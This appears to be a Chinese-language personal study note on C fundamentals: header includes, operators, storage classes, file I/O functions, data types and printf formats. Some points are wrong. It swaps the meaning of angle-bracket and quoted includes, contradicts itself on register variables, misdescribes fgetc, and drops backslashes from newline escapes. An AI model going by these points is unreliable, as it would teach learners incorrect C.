<p>头文件是扩展名为 <strong>.h</strong> 的文件，包含了 C 函数声明和宏定义，被多个源文件中引用共享</p> 
<pre><code class="language-cpp">1.引用用户多用
#include &lt;file&gt;
2.引用系统多用
#include "file"
</code></pre> 
<h4 id="%E5%BC%95%E7%94%A8%E5%A4%B4%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C">引用头文件操作</h4> 
<p><strong>#include</strong> 指令会指示 C 预处理器浏览指定的文件作为输入。预处理器的输出包含了已经生成的输出，被引用文件生成的输出以及 <strong>#include</strong> 指令之后的文本输出</p> 
<p>（注意！只引用一次头文件）</p> 
<pre><code class="language-cpp">#ifndef HEADER_FILE//包装器已经定义，之后编译器会忽略它的再次定义 等于跳过
#define HEADER_FILE//再次定义不会报错

the entire header file file

#endif//跳过！
</code></pre> 
<p>有条件引用实例：</p> 
<pre><code class="language-cpp">#if SYSTEM_1
   # include "system_1.h"
#elif SYSTEM_2
   # include "system_2.h"
#elif SYSTEM_3
   ...
#endif
</code></pre> 
<p>二</p> 
<pre><code class="language-cpp"> #define SYSTEM_H "system_1.h"
 #define SYSTEM_H "system_2.h"
 ...
 #include SYSTEM_H
</code></pre> 
<p></p> 
<p></p> 
<p></p> 
<h2 id="2.%E5%87%BD%E6%95%B0%EF%BC%88%E6%A0%87%E8%AF%86%E7%AC%A6%26%E5%85%B3%E9%94%AE%E5%AD%97%26%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%89%E5%AD%98%E5%82%A8%E7%B1%BB">2.函数（标识符&amp;关键字&amp;运算符）存储类</h2> 
<p>每个 C 语言程序都需要包含 main() 函数，main() 函数是程序运行的入口。</p> 
<pre><code class="language-cpp">return_type function_name( parameter list )
{
   body of the function
}
</code></pre> 
<h4 id="%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0">函数参数</h4> 
<table><tbody>
<tr>
<th>调用类型</th>
<th>描述</th>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-function-call-by-value.html" title="传值调用">传值调用</a></td>
<td>该方法把参数的实际值复制给函数的形式参数。在这种情况下，修改函数内的形式参数不会影响实际参数。</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-function-call-by-pointer.html" title="引用调用">引用调用</a></td>
<td>通过指针传递方式，形参为指向实参地址的指针，当对形参的指向操作时，就相当于对实参本身进行的操作。</td>
</tr>
</tbody></table> 
<h3 id="a.%20%E6%A0%87%E8%AF%86%E7%AC%A6%26%E5%85%B3%E9%94%AE%E5%AD%97">a. 标识符&amp;关键字</h3> 
<blockquote> 
 <p>标识符：</p> 
 <p>C 标识符是用来标识变量、函数，或任何其他用户自定义项目的名称。</p> 
 <p>一个标识符可由字母或下划线 _ 及数字组成（但不能以数字开头），而且是大小写敏感的，</p> 
 <p>C 标识符内不允许出现标点字符，比如 @、$ 和 % 等等</p> 
</blockquote> 
<p>长图警告！</p> 
<blockquote> 
 <p>关键字：</p> 
 <table><tbody>
<tr>
<td><span style="color:#fe2c24">关键字</span></td>
<td><span style="color:#fe2c24">说明</span></td>
</tr>
<tr>
<td>auto</td>
<td>声明自动变量</td>
</tr>
<tr>
<td>break</td>
<td>跳出当前循环</td>
</tr>
<tr>
<td>case</td>
<td>开关语句分支</td>
</tr>
<tr>
<td>char</td>
<td>声明字符型变量或函数返回值类型</td>
</tr>
<tr>
<td>const</td>
<td>定义常量，如果一个变量被 const 修饰，那么它的值就不能再被改变</td>
</tr>
<tr>
<td>continue</td>
<td>结束当前循环，开始下一轮循环</td>
</tr>
<tr>
<td>default</td>
<td>开关语句中的"其它"分支</td>
</tr>
<tr>
<td>do</td>
<td>循环语句的循环体</td>
</tr>
<tr>
<td>double</td>
<td>声明双精度浮点型变量或函数返回值类型</td>
</tr>
<tr>
<td>else</td>
<td>条件语句否定分支（与 if 连用）</td>
</tr>
<tr>
<td>enum</td>
<td>声明枚举类型</td>
</tr>
<tr>
<td>extern</td>
<td>声明变量或函数是在其它文件或本文件的其他位置定义</td>
</tr>
<tr>
<td>float</td>
<td>声明浮点型变量或函数返回值类型</td>
</tr>
<tr>
<td>for</td>
<td>一种循环语句</td>
</tr>
<tr>
<td>goto</td>
<td>无条件跳转语句</td>
</tr>
<tr>
<td>if</td>
<td>条件语句</td>
</tr>
<tr>
<td>int</td>
<td>声明整型变量或函数</td>
</tr>
<tr>
<td>long</td>
<td>声明长整型变量或函数返回值类型</td>
</tr>
<tr>
<td>register</td>
<td>声明寄存器变量</td>
</tr>
<tr>
<td>return</td>
<td>子程序返回语句（可以带参数，也可不带参数）</td>
</tr>
<tr>
<td>short</td>
<td>声明短整型变量或函数</td>
</tr>
<tr>
<td>signed</td>
<td>声明有符号类型变量或函数</td>
</tr>
<tr>
<td>sizeof</td>
<td>计算数据类型或变量长度（即所占字节数）</td>
</tr>
<tr>
<td>static</td>
<td>声明静态变量</td>
</tr>
<tr>
<td>struct</td>
<td>声明结构体类型</td>
</tr>
<tr>
<td>switch</td>
<td>用于开关语句</td>
</tr>
<tr>
<td>typedef</td>
<td>用以给数据类型取别名</td>
</tr>
<tr>
<td>unsigned</td>
<td>声明无符号类型变量或函数</td>
</tr>
<tr>
<td>union</td>
<td>声明共用体类型</td>
</tr>
<tr>
<td>void</td>
<td>声明函数无返回值或无参数，声明无类型指针</td>
</tr>
<tr>
<td>volatile</td>
<td>说明变量在程序执行中可被隐含地改变</td>
</tr>
<tr>
<td>while</td>
<td>循环语句的循环条件</td>
</tr>
</tbody></table> 
</blockquote> 
<h3 id="b.%20%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%88%E7%AE%97%E6%9C%AF%E3%80%81%E5%85%B3%E7%B3%BB%E3%80%81%E9%80%BB%E8%BE%91%E3%80%81%E4%BD%8D%E3%80%81%E8%B5%8B%E5%80%BC%E3%80%81%E6%9D%82%E9%A1%B9%2F%E5%85%B6%E5%AE%83%EF%BC%89">b. 运算符（算术、关系、逻辑、位、赋值、杂项/其它）</h3> 
<p>运算符是一种告诉编译器执行特定的数学或逻辑操作的符号。C 语言内置了丰富的运算符</p> 
<h4 id="%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%AC%A6">算术运算符</h4> 
<table><tbody>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
<tr>
<td>+</td>
<td>把两个操作数相加</td>
<td>A + B 将得到 30</td>
</tr>
<tr>
<td>-</td>
<td>从第一个操作数中减去第二个操作数</td>
<td>A - B 将得到 -10</td>
</tr>
<tr>
<td>*</td>
<td>把两个操作数相乘</td>
<td>A * B 将得到 200</td>
</tr>
<tr>
<td>/</td>
<td>分子除以分母</td>
<td>B / A 将得到 2</td>
</tr>
<tr>
<td>%</td>
<td>取模运算符，整除后的余数</td>
<td>B % A 将得到 0</td>
</tr>
<tr>
<td>++</td>
<td>自增运算符，整数值增加 1</td>
<td>A++ 将得到 11</td>
</tr>
<tr>
<td>--</td>
<td>自减运算符，整数值减少 1</td>
<td>A-- 将得到 9</td>
</tr>
</tbody></table> 
<h4 id="%E5%85%B3%E7%B3%BB%E8%BF%90%E7%AE%97%E7%AC%A6">关系运算符</h4> 
<table><tbody>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
<tr>
<td>==</td>
<td>检查两个操作数的值是否相等，如果相等则条件为真。</td>
<td>(A == B) 为假。</td>
</tr>
<tr>
<td>!=</td>
<td>检查两个操作数的值是否相等，如果不相等则条件为真。</td>
<td>(A != B) 为真。</td>
</tr>
<tr>
<td>&gt;</td>
<td>检查左操作数的值是否大于右操作数的值，如果是则条件为真。</td>
<td>(A &gt; B) 为假。</td>
</tr>
<tr>
<td>&lt;</td>
<td>检查左操作数的值是否小于右操作数的值，如果是则条件为真。</td>
<td>(A &lt; B) 为真。</td>
</tr>
<tr>
<td>&gt;=</td>
<td>检查左操作数的值是否大于或等于右操作数的值，如果是则条件为真。</td>
<td>(A &gt;= B) 为假。</td>
</tr>
<tr>
<td>&lt;=</td>
<td>检查左操作数的值是否小于或等于右操作数的值，如果是则条件为真。</td>
<td>(A &lt;= B) 为真。</td>
</tr>
</tbody></table> 
<h4 id="%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6">逻辑运算符</h4> 
<table><tbody>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>称为逻辑与运算符。如果两个操作数都非零，则条件为真。</td>
<td>(A &amp;&amp; B) 为假。</td>
</tr>
<tr>
<td>||</td>
<td>称为逻辑或运算符。如果两个操作数中有任意一个非零，则条件为真。</td>
<td>(A || B) 为真。</td>
</tr>
<tr>
<td>!</td>
<td>称为逻辑非运算符。用来逆转操作数的逻辑状态。如果条件为真则逻辑非运算符将使其为假。</td>
<td>!(A &amp;&amp; B) 为真。</td>
</tr>
</tbody></table> 
<h4 id="%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6">位运算符</h4> 
<table><tbody>
<tr>
<th>p</th>
<th>q</th>
<th>p &amp; q</th>
<th>p | q</th>
<th>p ^ q</th>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
</tbody></table> 
<h4 id="%E8%B5%8B%E5%80%BC%E8%BF%90%E7%AE%97%E7%AC%A6">赋值运算符</h4> 
<table><tbody>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
<tr>
<td>=</td>
<td>简单的赋值运算符，把右边操作数的值赋给左边操作数</td>
<td>C = A + B 将把 A + B 的值赋给 C</td>
</tr>
<tr>
<td>+=</td>
<td>加且赋值运算符，把右边操作数加上左边操作数的结果赋值给左边操作数</td>
<td>C += A 相当于 C = C + A</td>
</tr>
<tr>
<td>-=</td>
<td>减且赋值运算符，把左边操作数减去右边操作数的结果赋值给左边操作数</td>
<td>C -= A 相当于 C = C - A</td>
</tr>
<tr>
<td>*=</td>
<td>乘且赋值运算符，把右边操作数乘以左边操作数的结果赋值给左边操作数</td>
<td>C *= A 相当于 C = C * A</td>
</tr>
<tr>
<td>/=</td>
<td>除且赋值运算符，把左边操作数除以右边操作数的结果赋值给左边操作数</td>
<td>C /= A 相当于 C = C / A</td>
</tr>
<tr>
<td>%=</td>
<td>求模且赋值运算符，求两个操作数的模赋值给左边操作数</td>
<td>C %= A 相当于 C = C % A</td>
</tr>
<tr>
<td>&lt;&lt;=</td>
<td>左移且赋值运算符</td>
<td>C &lt;&lt;= 2 等同于 C = C &lt;&lt; 2</td>
</tr>
<tr>
<td>&gt;&gt;=</td>
<td>右移且赋值运算符</td>
<td>C &gt;&gt;= 2 等同于 C = C &gt;&gt; 2</td>
</tr>
<tr>
<td>&amp;=</td>
<td>按位与且赋值运算符</td>
<td>C &amp;= 2 等同于 C = C &amp; 2</td>
</tr>
<tr>
<td>^=</td>
<td>按位异或且赋值运算符</td>
<td>C ^= 2 等同于 C = C ^ 2</td>
</tr>
<tr>
<td>|=</td>
<td>按位或且赋值运算符</td>
<td>C |= 2 等同于 C = C | 2</td>
</tr>
</tbody></table> 
<h4 id="%C2%A0%E6%9D%82%E9%A1%B9%2F%E5%85%B6%E5%AE%83%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%88sizeof%20%26%20%E4%B8%89%E5%85%83%EF%BC%89"> 杂项/其它运算符（sizeof &amp; 三元）</h4> 
<table><tbody>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
<tr>
<td>sizeof()</td>
<td>返回变量的大小。</td>
<td>sizeof(a) 将返回 4，其中 a 是整数。</td>
</tr>
<tr>
<td>&amp;</td>
<td>返回变量的地址。</td>
<td>&amp;a; 将给出变量的实际地址。</td>
</tr>
<tr>
<td>*</td>
<td>指向一个变量。</td>
<td>*a; 将指向一个变量。</td>
</tr>
<tr>
<td>? :</td>
<td>条件表达式</td>
<td>如果条件为真 ? 则值为 X : 否则值为 Y</td>
</tr>
</tbody></table> 
<p></p> 
<h4 id="%E6%89%A9%E5%B1%95%EF%BC%9A%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7">扩展：运算符优先级</h4> 
<table><tbody>
<tr>
<th>类别 </th>
<th>运算符 </th>
<th>结合性 </th>
</tr>
<tr>
<td>后缀 </td>
<td>() [] -&gt; . ++ - -  </td>
<td>从左到右 </td>
</tr>
<tr>
<td>一元 </td>
<td>+ - ! ~ ++ - - (type)* &amp; sizeof </td>
<td>从右到左 </td>
</tr>
<tr>
<td>乘除 </td>
<td>* / % </td>
<td>从左到右 </td>
</tr>
<tr>
<td>加减 </td>
<td>+ - </td>
<td>从左到右 </td>
</tr>
<tr>
<td>移位 </td>
<td>&lt;&lt; &gt;&gt; </td>
<td>从左到右 </td>
</tr>
<tr>
<td>关系 </td>
<td>&lt; &lt;= &gt; &gt;= </td>
<td>从左到右 </td>
</tr>
<tr>
<td>相等 </td>
<td>== != </td>
<td>从左到右 </td>
</tr>
<tr>
<td>位与 AND </td>
<td>&amp; </td>
<td>从左到右 </td>
</tr>
<tr>
<td>位异或 XOR </td>
<td>^ </td>
<td>从左到右 </td>
</tr>
<tr>
<td>位或 OR </td>
<td>| </td>
<td>从左到右 </td>
</tr>
<tr>
<td>逻辑与 AND </td>
<td>&amp;&amp; </td>
<td>从左到右 </td>
</tr>
<tr>
<td>逻辑或 OR </td>
<td>|| </td>
<td>从左到右 </td>
</tr>
<tr>
<td>条件 </td>
<td>?: </td>
<td>从右到左 </td>
</tr>
<tr>
<td>赋值 </td>
<td>= += -= *= /= %=&gt;&gt;= &lt;&lt;= &amp;= ^= |= </td>
<td>从右到左 </td>
</tr>
<tr>
<td>逗号 </td>
<td>, </td>
<td>从左到右 </td>
</tr>
</tbody></table> 
<p></p> 
<h3 id="c.%20%E5%AD%98%E5%82%A8%E7%B1%BB">c. 存储类</h3> 
<h4 id="1%E3%80%81auto%20%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%88%E6%89%80%E6%9C%89%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E9%BB%98%E8%AE%A4%E7%9A%84%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%89">1、auto 存储类（所有局部变量默认的存储类）</h4> 
<p>auto 只能用在函数内，即 auto 只能修饰局部变量</p> 
<p></p> 
<h4 id="2%E3%80%81register%20%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%88%E9%A2%91%E7%B9%81%E8%AE%BF%E9%97%AE%EF%BC%89">2、register 存储类（频繁访问）</h4> 
<p>register 用于存储在寄存器中而不是 RAM 中的局部变量。这意味着变量的最大尺寸等于寄存器的大小（通常是一个字），且不能对它应用一元的 '&amp;' 运算符（因为它没有内存位置）。（因为存储在寄存器中，所以访问速度更快。但由于存储在 RAM 中，故不能直接取地址）</p> 
<p></p> 
<h4 id="3%E3%80%81static%20%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%88%E4%B8%80%E6%AC%A1%E5%88%9D%E5%A7%8B%E5%8C%96%E5%A4%9A%E6%AC%A1%E4%BD%BF%E7%94%A8%EF%BC%89">3、static 存储类（一次初始化多次使用）</h4> 
<p>static 静态变量在程序中只被初始化一次，即使函数被调用多次，该变量的值也不会重置。</p> 
<p></p> 
<h4 id="4%E3%80%81extern%20%E5%AD%98%E5%82%A8%E7%B1%BB%EF%BC%88%E5%85%A8%E5%B1%80%E5%BC%95%E7%94%A8%E5%A3%B0%E6%98%8E%EF%BC%89">4、extern 存储类（全局引用声明）</h4> 
<p><strong>extern</strong> 存储类用于定义在其他文件中声明的全局变量或函数。当使用 extern 关键字时，不会为变量分配任何存储空间，而只是指示编译器该变量在其他文件中定义。</p> 
<p><strong>extern</strong> 存储类用于提供一个全局变量的引用，全局变量对所有的程序文件都是可见的。当您使用 <strong>extern</strong> 时，对于无法初始化的变量，会把变量名指向一个之前定义过的存储位置。</p> 
<p>当您有多个文件且定义了一个可以在其他文件中使用的全局变量或函数时，可以在其他文件中使用 <em>extern</em> 来得到已定义的变量或函数的引用。可以这么理解，<em>extern</em> 是用来在另一个文件中声明一个全局变量或函数。</p> 
<p>extern 修饰符通常用于当有两个或多个文件共享相同的全局变量或函数的时候</p> 
<p></p> 
<h3 id="d.%20%E8%BE%93%E5%85%A5%20%26%20%E8%BE%93%E5%87%BA">d. 输入 &amp; 输出</h3> 
<p><span style="color:#fe2c24">标准文件</span>：C 语言把所有的设备都当作文件，以下三个文件会在程序执行时自动打开，以便访问键盘和屏幕</p> 
<table><tbody>
<tr>
<th>标准文件</th>
<th>文件指针</th>
<th>设备</th>
</tr>
<tr>
<td>标准输入</td>
<td>stdin</td>
<td>键盘</td>
</tr>
<tr>
<td>标准输出</td>
<td>stdout</td>
<td>屏幕</td>
</tr>
<tr>
<td>标准错误</td>
<td>stderr</td>
<td>您的屏幕</td>
</tr>
</tbody></table> 
<p><span style="color:#7b7f82"><em>（而常用的 I/O (输入/输出) 通常使用 printf() 和 scanf() 两个函数）</em></span></p> 
<p></p> 
<table border="1" cellpadding="1" cellspacing="1" style="width:500px">
<caption>
   常用 IO 函数 
 </caption>
<thead><tr>
<th>读取/输入 I</th>
<th>写出/输出 O</th>
</tr></thead>
<tbody>
<tr>
<td> <p>i<strong>nt getchar(void)</strong></p> <p>函数从屏幕读取下一个可用的字符，并把它返回为一个整数</p> </td>
<td> <p><strong>int putchar(int c)</strong></p> <p>函数把字符输出到屏幕上，并返回相同的字符</p> </td>
</tr>
<tr>
<td> <p><strong>char *gets(char *s)</strong></p> <p>函数从 <strong>stdin</strong> 读取一行到 <strong>s</strong> 所指向的缓冲区，直到一个终止符或 EOF</p> </td>
<td> <p>i<strong>nt puts(const char *s)</strong></p> <p>函数把字符串 s 和一个尾随的换行符写入到 <strong>stdout</strong></p> </td>
</tr>
<tr>
<td> <p><strong>int scanf(const char *format, ...)</strong></p> <p>函数从标准输入流 <strong>stdin</strong> 读取输入，并根据提供的 <strong>format</strong> 来浏览输入</p> <p><span style="color:#7b7f82">（另外，在读取字符串时，只要遇到一个空格，scanf() 就会停止读取，所以 "this is test" 对 scanf() 来说是三个字符串）</span></p> </td>
<td> <p><strong>int printf(const char *format, ...)</strong></p> <p>函数把输出写入到标准输出流 <strong>stdout </strong>，并根据提供的格式产生输出</p> </td>
</tr>
</tbody>
</table> 
<h4 id="1.%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6">1.打开文件</h4> 
<pre><code class="language-cpp">FILE *fopen( const char *filename, const char *mode );
</code></pre> 
<table>
<caption>
   在这里，filename 是字符串，用来命名文件，访问模式 mode 的值可以是下列值中的一个： 
 </caption>
<tbody>
<tr>
<th>模式</th>
<th>描述</th>
</tr>
<tr>
<td>r</td>
<td>打开一个已有的文本文件，允许读取文件。</td>
</tr>
<tr>
<td>w</td>
<td>打开一个文本文件，允许写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会从文件的开头写入内容。如果文件存在，则该会被截断为零长度，重新写入。</td>
</tr>
<tr>
<td>a</td>
<td>打开一个文本文件，以追加模式写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会在已有的文件内容中追加内容。</td>
</tr>
<tr>
<td>r+</td>
<td>打开一个文本文件，允许读写文件。</td>
</tr>
<tr>
<td>w+</td>
<td>打开一个文本文件，允许读写文件。如果文件已存在，则文件会被截断为零长度，如果文件不存在，则会创建一个新文件。</td>
</tr>
<tr>
<td>a+</td>
<td>打开一个文本文件，允许读写文件。如果文件不存在，则会创建一个新文件。读取会从文件的开头开始，写入则只能是追加模式。</td>
</tr>
</tbody>
</table> 
<p> 如果处理的是二进制文件，则需使用下面的访问模式来取代上面的访问模式：</p> 
<blockquote> 
 <p>"rb"，"wb"，"ab"，"rb+"，"r+b"，"wb+"，"w+b"，"ab+"，"a+b"</p> 
</blockquote> 
<p></p> 
<h4 id="2.%E5%85%B3%E9%97%AD%E6%96%87%E4%BB%B6">2.关闭文件</h4> 
<pre><code class="language-cpp"> int fclose( FILE *fp );
</code></pre> 
<p>如果成功关闭文件，<strong>fclose( )</strong> 函数返回零，如果关闭文件时发生错误，函数返回 <strong>EOF</strong>。这个函数实际上，会清空缓冲区中的数据，关闭文件，并释放用于该文件的所有内存。EOF 是一个定义在头文件 <strong>stdio.h</strong> 中的常量。</p> 
<p>C 标准库提供了各种函数来按字符或者以固定长度字符串的形式读写文件。</p> 
<p></p> 
<h4 id="3.%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6">3.写入文件</h4> 
<pre><code class="language-cpp">int fputc( int c, FILE *fp );
</code></pre> 
<p>函数 <strong>fputc()</strong> 把参数 c 的字符值写入到 fp 所指向的输出流中。如果写入成功，它会返回写入的字符，如果发生错误，则会返回 <strong>EOF</strong></p> 
<pre><code class="language-cpp">int fputs( const char *s, FILE *fp );//把以 null 结尾的字符串写入到流中
</code></pre> 
<p>函数 <strong>fputs()</strong> 把字符串 <strong>s</strong> 写入到 fp 所指向的输出流中。如果写入成功，它会返回一个非负值，如果发生错误，则会返回 <strong>EOF</strong></p> 
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
 
int main()
{
   FILE *fp = NULL;//创建文件指针变量
 
   fp = fopen("/tmp/test.txt", "w+");//设置文件路径和格式（请确保文件已经建立）
   fprintf(fp, "This is testing for fprintf...n");//打印入文件中
   fputs("This is testing for fputs...n", fp);//写入文件中
   fclose(fp);//关闭文件
}</code></pre> 
<p></p> 
<h4 id="4.%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6">4.读取文件</h4> 
<p>从文件读取单个字符的最简单的函数</p> 
<pre><code class="language-cpp">int fgetc( FILE * fp );
</code></pre> 
<p><strong>fgetc()</strong> 函数从 fp 所指向的输入文件中读取一个字符。返回值是读取的字符，如果发生错误则返回 <strong>EOF</strong></p> 
<pre><code class="language-cpp">char *fgets( char *buf, int n, FILE *fp );
</code></pre> 
<p><strong>fgets()</strong> 从 fp 所指向的输入流中读取 n - 1 个字符。它会把读取的字符串复制到缓冲区 <strong>buf</strong>，并在最后追加一个 <strong>null</strong> 字符来终止字符串。</p> 
<p>如果这个函数在读取最后一个字符之前就遇到一个换行符 'n' 或文件的末尾 EOF，则只会返回读取到的字符，包括换行符。您也可以使用 <strong>int fscanf(FILE *fp, const char *format, ...)</strong> 函数来从文件中读取字符串，但是在遇到第一个空格和换行符时，它会停止读取。</p> 
<table border="1" cellpadding="1" cellspacing="1" style="width:500px">
<thead><tr>
<th>fgetc()</th>
<th>fgets()</th>
</tr></thead>
<tbody><tr>
<td>读取一个字符，遇到空格及换行符或文件末尾 EOF 为止</td>
<td>读取一行字符</td>
</tr></tbody>
</table> 
<p>二进制 IO 函数</p> 
<pre><code class="language-cpp">size_t fread(void *ptr, size_t size_of_elements, 
             size_t number_of_elements, FILE *a_file);
              
size_t fwrite(const void *ptr, size_t size_of_elements, 
             size_t number_of_elements, FILE *a_file);</code></pre> 
<p></p> 
<h3 id="e.%20%E9%80%92%E5%BD%92%EF%BC%88%E5%87%BD%E6%95%B0%E7%9A%84%20if%20%E5%A5%97%E5%A8%83%EF%BC%89">e. 递归（函数的 if 套娃）</h3> 
<p><img alt="" height="698" src="https://images2.imgbox.com/6f/79/6WQtwOWA_o.png" width="504"></p> 
<p>C 语言支持递归，即一个函数可以调用其自身。但在使用递归时，程序员需要注意定义一个从函数退出的条件，否则会进入死循环。</p> 
<p>递归函数在解决许多数学问题上起了至关重要的作用，比如计算一个数的阶乘、生成斐波那契数列，等等。</p> 
<p></p> 
<p></p> 
<p></p> 
<h2 id="3.%E5%8F%98%E9%87%8F%26%E5%B8%B8%E9%87%8F%EF%BC%88%E6%95%B0%E6%8D%AE%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%89">3.变量&amp;常量（数据的缓冲区）</h2> 
<table><tbody>
<tr>
<th>序号</th>
<th>类型与描述</th>
</tr>
<tr>
<td>1</td>
<td> <p><strong>基本数据类型</strong><br> 它们是算术类型，包括整型（int）、字符型（char）、浮点型（float）和双精度浮点型（double）</p> </td>
</tr>
<tr>
<td>2</td>
<td> <p><strong>枚举类型</strong><br> 它们也是算术类型，被用来定义在程序中只能赋予其一定的离散整数值的变量</p> </td>
</tr>
<tr>
<td>3</td>
<td> <p><strong>void 类型</strong><br> 类型说明符 <em>void</em> 表示没有值的数据类型，通常用于函数返回值</p> </td>
</tr>
<tr>
<td>4</td>
<td>
<strong>派生类型：</strong><br> 包括数组类型、指针类型和结构体类型</td>
</tr>
</tbody></table> 
<p><span style="color:#fe2c24">sizeof 运算符可以获取某对象或类型的存储字节大小</span></p> 
<p></p> 
<table>
<caption>
   printf() 输出格式 
 </caption>
<thead><tr>
<th>格式字符</th>
<th>意义</th>
</tr></thead>
<tbody>
<tr>
<th>a, A</th>
<td> <p>以十六进制形式输出浮点数(C99 新增)。</p> <p>实例 printf("pi=%an", 3.14);         输出 <strong>pi=0x1.91eb86p+1</strong></p> </td>
</tr>
<tr>
<th>d</th>
<td>以十进制形式输出带符号整数(正数不输出符号)</td>
</tr>
<tr>
<th>zu</th>
<td>输出 size_t 型（不能输出负数）</td>
</tr>
<tr>
<th>o</th>
<td>以八进制形式输出无符号整数(不输出前缀0)</td>
</tr>
<tr>
<th>x, X</th>
<td>以十六进制形式输出无符号整数(不输出前缀Ox)</td>
</tr>
<tr>
<th>u</th>
<td>以十进制形式输出无符号整数</td>
</tr>
<tr>
<th>f</th>
<td>以小数形式输出单、双精度实数</td>
</tr>
<tr>
<th>e, E</th>
<td>以指数形式输出单、双精度实数</td>
</tr>
<tr>
<th>g, G</th>
<td>以%f或%e中较短的输出宽度输出单、双精度实数</td>
</tr>
<tr>
<th>c</th>
<td>输出单个字符</td>
</tr>
<tr>
<th>s</th>
<td>输出字符串</td>
</tr>
<tr>
<th>p</th>
<td>输出指针地址</td>
</tr>
<tr>
<th>lu</th>
<td>32位无符号整数</td>
</tr>
<tr>
<th>llu</th>
<td>64位无符号整数</td>
</tr>
</tbody>
</table> 
<p></p> 
<h3 id="%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">强制类型转换</h3> 
<p>强制类型转换是把变量从一种类型转换为另一种数据类型</p> 
<blockquote> 
 <p>类型转换：</p> 
 <ul>
<li> <p><strong>隐式类型转换：</strong>隐式类型转换是在表达式中自动发生的，无需进行任何明确的指令或函数调用。它通常是将一种较小的类型自动转换为较大的类型，例如，将int类型转换为long类型或float类型转换为double类型。隐式类型转换也可能会导致数据精度丢失或数据截断。（整数/浮点数提升）</p> </li>
<li> <p><strong>显式类型转换：</strong>显式类型转换需要使用强制类型转换运算符（type casting operator），它可以将一个数据类型的值强制转换为另一种数据类型的值。强制类型转换可以使程序员在必要时对数据类型进行更精确的控制，但也可能会导致数据丢失或截断。</p> </li>
</ul> 
</blockquote> 
<p><img alt="" height="818" src="https://images2.imgbox.com/e3/77/WKApJ6uC_o.png" width="365"></p> 
<p><span style="color:#7b7f82"><em>（要注意的是强制类型转换运算符的优先级大于除法）</em></span></p> 
<table>
<caption>
   基本数据类型 
 </caption>
<thead><tr>
<th>类型</th>
<th>描述</th>
</tr></thead>
<tbody>
<tr>
<th>char</th>
<td>通常是一个字节（八位）, 这是一个整数类型</td>
</tr>
<tr>
<th>int</th>
<td>整型，4 个字节，取值范围 -2147483648 到 2147483647</td>
</tr>
<tr>
<th>size_t</th>
<td>无符号整型，即在库中定义为 unsigned int</td>
</tr>
<tr>
<th>float</th>
<td> <p>单精度浮点值。单精度是这样的格式，1位符号，8位指数，23位小数</p> <p></p> <p class="img-center"><img alt="" height="75" src="https://images2.imgbox.com/ac/3d/iG4QefKN_o.png" width="590"></p> </td>
</tr>
<tr>
<th>double</th>
<td> <p>双精度浮点值。双精度是1位符号，11位指数，52位小数。</p> <p></p> <p class="img-center"><img alt="" height="125" src="https://images2.imgbox.com/d0/78/4iKLI9dL_o.png" width="618"></p> </td>
</tr>
<tr>
<th>void</th>
<td>表示类型的缺失</td>
</tr>
</tbody>
</table> 
<p></p> 
<p></p> 
<h3 id="%E5%8F%98%E9%87%8F%E5%AE%9A%E4%B9%89%E5%92%8C%E5%A3%B0%E6%98%8E">变量定义和声明</h3> 
<blockquote> 
 <p>变量定义和声明的区别：</p> 
 <ul>
<li>前者是需要建立存储空间的。例如：int a 在声明的时候就已经建立了存储空间。</li>
<li>后者是不需要建立存储空间的，通过使用 extern 关键字声明变量名却不定义它。 例如：extern int a 其中变量 a 可以在别的文件中定义的，相当于外部变量（全局变量）</li>
</ul> 
</blockquote> 
<p></p> 
<h4 id="%E5%8F%98%E9%87%8F%E5%88%9D%E5%A7%8B%E5%8C%96%EF%BC%88%E4%B8%BA%E4%BA%86%E9%81%BF%E5%85%8D%E4%B8%8D%E7%A1%AE%E5%AE%9A%E7%9A%84%E8%A1%8C%E4%B8%BA%2F%E9%94%99%E8%AF%AF%EF%BC%89">变量初始化（为了避免不确定的行为/错误）</h4> 
<ul>
<li>显式初始化：用 = 来赋值</li>
<li>隐式初始化：系统默认为数据赋值</li>
</ul> 
<p>注意！非静态的局部变量是不会隐式初始化的！</p> 
<p>总结：<span style="color:#fe2c24">C 语言中变量的默认值取决于其类型和作用域。全局变量和静态变量的默认值为 <strong>0</strong>，字符型变量的默认值为 ，指针变量的默认值为 NULL，而局部变量没有默认值，其初始值是未定义的。</span></p> 
<p></p> 
